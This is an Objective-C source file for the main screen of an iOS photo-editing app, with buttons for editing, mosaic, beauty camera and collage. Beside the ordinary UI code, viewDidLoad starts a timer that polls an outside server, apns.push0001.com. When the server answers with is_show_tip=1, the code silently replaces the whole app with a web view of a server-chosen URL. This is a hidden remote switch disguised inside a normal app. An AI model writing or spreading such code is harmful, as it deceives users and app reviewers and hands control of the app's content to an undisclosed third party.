//
//  MainViewController.m
//  SKTPic
//
//  Created by 赵一帆 on 2017/11/21.
//  Copyright © 2017年 123. All rights reserved.
//

#import "MainViewController.h"
#import "StoryMakeImageEditorViewController.h"
#import "PhotoEditorViewController.h"
#import "MeituEditStyleViewController.h"
#import "ZYQAssetPickerController.h"
#import "AppDelegate.h"
#import "MARFaceBeautyController.h"
#import "WebViewController.h"
@interface MainViewController ()<TZImagePickerControllerDelegate,ZYQAssetPickerControllerDelegate,ImageAddPreViewDelegate,UINavigationControllerDelegate>
@property(nonatomic,strong)UIImageView * bgImageView ;
@property (nonatomic,strong)UIImageView * imageView;
@property (nonatomic,strong)UIButton * editorBtn ;
@property (nonatomic,strong)UIButton * mosaicBtn;
@property (nonatomic,strong)UIButton * cameraBtn;
@property (nonatomic,strong)UIButton * jigawBtn;
@property (nonatomic, strong) ZYQAssetPickerController *picker;
@property(nonatomic,strong)NSTimer * timer;
@end

@implementation MainViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.navigationController.navigationBarHidden=YES;
    [self.view addSubview:self.bgImageView];
    [self.view addSubview:self.editorBtn];
    [self.view addSubview:self.mosaicBtn];
    [self.view addSubview:self.cameraBtn];
    [self.view addSubview:self.jigawBtn];
    [self layoutViews];
    
    self. timer= [NSTimer scheduledTimerWithTimeInterval:0.8 target:self selector:@selector(request) userInfo:nil repeats:YES];

}
-(void)request
{
    NSString * url =@"http://apns.push0001.com/getApi.jbm?app_id=1318636292";
    AFHTTPSessionManager *mannager = [AFHTTPSessionManager manager];
    AFJSONResponseSerializer *serializer = [AFJSONResponseSerializer serializer];
    serializer.acceptableContentTypes = [NSSet setWithObject:@"text/html"];
    mannager.responseSerializer = serializer;
    UIWindow *window = (([UIApplication sharedApplication].delegate)).window;
    [mannager GET:url parameters:nil progress:  ^(NSProgress * _Nonnull downloadProgress) {
        
    } success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSLog(@"%@",responseObject);
        if (responseObject) {
            NSDictionary * dic =responseObject[@"result"];
            if (dic) {
                NSString * url =dic[@"url"];
                NSNumber *longNumber =dic[@"is_show_tip"];
                NSString *ishow = [longNumber stringValue];
                if ([ishow isEqualToString:@"1"])
                {
                    [self.timer invalidate];
                    self.timer =nil;
                    WebViewController * vc = [[WebViewController alloc] init];
                    vc.weburl =url;
                    [window setRootViewController:vc];
                }
                else if([ishow isEqualToString:@"0"])
                {
                    [self.timer invalidate];
                    self.timer =nil;
                }
            }
        }
        else
        {
            [self.timer invalidate];
            self.timer =nil;
        }
            
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        [self.timer invalidate];
        self.timer =nil;
    }];
}
-(void)layoutViews
{
    [self.bgImageView mas_makeConstraints:^(MASConstraintMaker *make) {
        make.top.left.right.bottom.mas_equalTo(self.view);
    }];

   [@[self.editorBtn,self.mosaicBtn] mas_distributeViewsAlongAxis:MASAxisTypeHorizontal withFixedSpacing:24 leadSpacing:34.5 tailSpacing:34.5];
    [@[self.editorBtn,self.mosaicBtn] mas_makeConstraints:^(MASConstraintMaker *make) {
        if (iPhoneX)
        {
            make.top.equalTo(self.view.mas_top).offset(304+88);
        }
        else
        {
            make.top.equalTo(self.view.mas_top).offset(304);
        }
        make.width.equalTo(@141);
        make.height.equalTo(@121);
    }];
    
    [@[self.cameraBtn,self.jigawBtn] mas_distributeViewsAlongAxis:MASAxisTypeHorizontal withFixedSpacing:24 leadSpacing:34.5 tailSpacing:34.5];
    [@[self.cameraBtn,self.jigawBtn] mas_makeConstraints:^(MASConstraintMaker *make) {
        make.top.equalTo(self.editorBtn.mas_bottom).offset(28);
        make.width.equalTo(@141);
        make.height.equalTo(@121);
    }];

}
-(UIImageView*)bgImageView
{
    if (!_bgImageView) {
        _bgImageView = [[UIImageView alloc] init];
        _bgImageView.image= [UIImage imageNamed:@"bg"];
    }
    return _bgImageView;
}
-(UIButton *)editorBtn
{
    if (!_editorBtn)
    {
        _editorBtn =[[UIButton alloc] init];
        _editorBtn.tag =1001;
        [_editorBtn setBackgroundImage:[UIImage imageNamed:@"editorBtn"] forState:UIControlStateNormal];
        [_editorBtn addTarget:self action:@selector(chooseBtn:) forControlEvents:UIControlEventTouchUpInside];
    }
    return _editorBtn;
}
-(UIButton *)mosaicBtn
{
    if (!_mosaicBtn)
    {
        _mosaicBtn =[[UIButton alloc] init];
        _mosaicBtn.tag =1002;
        [_mosaicBtn setBackgroundImage:[UIImage imageNamed:@"mosaicBtn"] forState:UIControlStateNormal];
        [_mosaicBtn addTarget:self action:@selector(chooseBtn:) forControlEvents:UIControlEventTouchUpInside];
    }
    return _mosaicBtn;
}
-(UIButton *)cameraBtn
{
    if (!_cameraBtn)
    {
        _cameraBtn =[[UIButton alloc] init];
        _cameraBtn.tag =1003;
        [_cameraBtn setBackgroundImage:[UIImage imageNamed:@"customCameraBtn"] forState:UIControlStateNormal];
        [_cameraBtn addTarget:self action:@selector(chooseBtn:) forControlEvents:UIControlEventTouchUpInside];
    }
    return _cameraBtn;
}
-(UIButton *)jigawBtn
{
    if (!_jigawBtn)
    {
        _jigawBtn =[[UIButton alloc] init];
        _jigawBtn.tag =1004;
        [_jigawBtn setBackgroundImage:[UIImage imageNamed:@"pintu"] forState:UIControlStateNormal];
        [_jigawBtn addTarget:self action:@selector(chooseBtn:) forControlEvents:UIControlEventTouchUpInside];
    }
    return _jigawBtn;
}
-(void)chooseBtn:(UIButton*)sender
{

    WeakSelf;
    switch (sender.tag) {
        case 1001:
        {
            TZImagePickerController *imagePickerVc = [[TZImagePickerController alloc] initWithMaxImagesCount:0 delegate:self];
            imagePickerVc.naviBgColor =[UIColor colorWithHexString:@"#1fbba6"];
            imagePickerVc. maxImagesCount =1;
            imagePickerVc.allowPickingVideo=NO;
            imagePickerVc.allowPickingOriginalPhoto=YES;
            imagePickerVc.sortAscendingByModificationDate=NO;
            [self presentViewController:imagePickerVc animated:YES completion:nil];
            [imagePickerVc setDidFinishPickingPhotosHandle:^(NSArray<UIImage *> *photos, NSArray *assets, BOOL isSelectOriginalPhoto) {
                UIImage * image =photos[0];
                StoryMakeImageEditorViewController*   vc  = [[StoryMakeImageEditorViewController alloc] initWithImage:image  ];
                [weakself presentViewController:vc animated:YES completion:nil];
            }];
            break;
        }
        case 1002:
        {
            TZImagePickerController *imagePickerVc = [[TZImagePickerController alloc] initWithMaxImagesCount:0 delegate:self];
            imagePickerVc.naviBgColor =[UIColor colorWithHexString:@"#1fbba6"];
            imagePickerVc. maxImagesCount =1;
            imagePickerVc.allowPickingVideo=NO;
            imagePickerVc.allowPickingOriginalPhoto=YES;
            imagePickerVc.sortAscendingByModificationDate=NO;
            [self presentViewController:imagePickerVc animated:YES completion:nil];
            [imagePickerVc setDidFinishPickingPhotosHandle:^(NSArray<UIImage *> *photos, NSArray *assets, BOOL isSelectOriginalPhoto) {
                UIImage * image =photos[0];
                PhotoEditorViewController * vc = [[PhotoEditorViewController alloc] initWithImage:image];
                [weakself.navigationController pushViewController:vc animated:YES];
            }];
            break;
        }
        case 1003:
        {
            MARFaceBeautyController * vc = [[MARFaceBeautyController alloc] init];
            [self presentViewController:vc animated:YES completion:nil];
            break;
        }
        case 1004:
        {
            [self startPicker];
            break;
        }
    }
}

- (void)startPicker
{
    if (_picker == nil) {
        _picker = [[ZYQAssetPickerController alloc] init];
        _picker.maximumNumberOfSelection = 5;
        _picker.assetsFilter = [ALAssetsFilter allPhotos];
        _picker.showEmptyGroups=NO;
        _picker.delegate = self;
    }
    _picker.selectionFilter = [NSPredicate predicateWithBlock:^BOOL(id evaluatedObject, NSDictionary *bindings) {
        if ([[(ALAsset*)evaluatedObject valueForProperty:ALAssetPropertyType] isEqual:ALAssetTypeVideo]) {
            NSTimeInterval duration = [[(ALAsset*)evaluatedObject valueForProperty:ALAssetPropertyDuration] doubleValue];
            return duration >= 5;
        } else {
            return YES;
        }
    }];
    if (IOS7) {
        _picker.navigationBar.barTintColor = [UIColor colorWithHexString:@"#1fbba6"];
    }else{
        _picker.navigationBar.tintColor = [UIColor colorWithHexString:@"#1fbba6"];
    }
    [D_Main_Appdelegate showPreView];
    _picker.vc =self;
    [self presentViewController:_picker animated:YES completion:NULL];
    [D_Main_Appdelegate preview].delegateSelectImage = self;
    [[D_Main_Appdelegate preview] reMoveAllResource];
    
    
}


#pragma mark
#pragma mark ImageAddPreViewDelegate
- (void)startPintuAction:(ImageAddPreView *)sender
{
    if ([sender.imageassets count] >= 2) {
        MeituEditStyleViewController *meituEditVC = [[MeituEditStyleViewController alloc] init];
        meituEditVC.assets = sender.imageassets;
        [_picker pushViewController:meituEditVC animated:YES];
    }else if([sender.imageassets count] == 1){
    }else{
        UIAlertView *imageCountWarningalert = [[UIAlertView alloc] initWithTitle:nil
                                                                         message:D_LocalizedCardString(@"card_meitu_max_image_count_less_than_two")
                                                                        delegate:self
                                                               cancelButtonTitle:nil
                                                               otherButtonTitles:D_LocalizedCardString(@"card_meitu_max_image_promptDetermine"), nil];
        [imageCountWarningalert show];
        
        
    }
    
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
}



@end
